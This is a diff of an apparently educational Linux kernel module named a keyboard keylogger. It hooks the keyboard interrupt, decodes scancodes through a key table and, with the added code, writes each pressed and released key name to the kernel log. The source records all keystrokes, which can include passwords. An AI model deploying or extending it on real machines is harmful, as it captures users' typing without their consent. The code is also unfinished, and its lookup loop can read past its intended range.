@@ -9,10 +9,21 @@ MODULE_LICENSE("GPL");
 MODULE_AUTHOR("mberengu");
 MODULE_DESCRIPTION("keyboard keylogger driver");
 
+#define IRQ_NAME "Keylogger"
+
 // dmesg | grep -i irq  => [    0.539481] serio: i8042 KBD port at 0x60,0x64 irq 1
 #define IRQ_NUM 1
-#define IRQ_NAME "Keylogger"
 #define KEYBOARD_PORT 0x60
+
+/*
+ *  CHAT GPT :
+ *
+ * The RELEASED_MASK is used to filter out the eighth bit (bit 7)
+ * in the scan code to determine whether a key is pressed or released.
+ * When a key is pressed, the eighth bit is typically cleared (0),
+ * while when it is released, the eighth bit is typically set (1).
+ * This mask is defined as 0x80 to filter out the eighth bit.
+ */
 #define RELEASED_MASK 0x80
 
 // id for irq interrupt
@@ -66,7 +77,7 @@ static struct keycodes_s	keycodes[] = {
 	{"!", "§", "", 0x35, 0xb5},
 
 	// NUMBERS
-	{"&", "1", "", 0x02, 0x82},
+/*	{"&", "1", "", 0x02, 0x82},
 	{"é", "2", "~", 0x03, 0x83},
 	{"\"", "3", "#", 0x04 0x84},
 	{"'", "4", "{", 0x05, 0x85},
@@ -77,7 +88,7 @@ static struct keycodes_s	keycodes[] = {
 	{"ç", "9", "^", 0x0a, 0x8a},
 	{"à", "0", "@", 0x0b, 0x8b},
 	{")", "°", "]", 0x0c, 0x8c},
-	{"=", "+", "}", 0x0d, 0x8d},
+	{"=", "+", "}", 0x0d, 0x8d}, */
 	
 	// PAD - NUMBERS
 /*	{"0", "", "", 0x00, 0x00},
@@ -138,7 +149,7 @@ static struct keycodes_s	keycodes[] = {
 						// released [e0]
 						// released [cb]
 
-	{"right arrow", "", "", 0x4d, 0xcd}	// released [e0]
+	{"right arrow", "", "", 0x4d, 0xcd},	// released [e0]
 						// pressed [4d]
 						// released [e0]
 						// released [cd] 
@@ -210,10 +221,25 @@ static void keyboard_tasklet(struct tasklet_struct *tasklet)
 	if (state)
 	{
 		pr_info("touche released [%x]\n", scancode);
+		int i = 0;
+		while (i < 70 && scancode != keycodes[i].released)
+			i++;
+		if (scancode != keycodes[i].released)
+			pr_info("key not found\n");
+		else
+			pr_info("key = %s\n", keycodes[i].key);
+
 	}
 	else
 	{
 		pr_info("touche pressed [%x]\n", scancode);
+		int i = 0;
+		while (i < 70 && scancode != keycodes[i].pressed)
+			i++;
+		if (scancode != keycodes[i].pressed)
+			pr_info("key not found\n");
+		else
+			pr_info("key = %s\n", keycodes[i].key);
 	}
 
 }
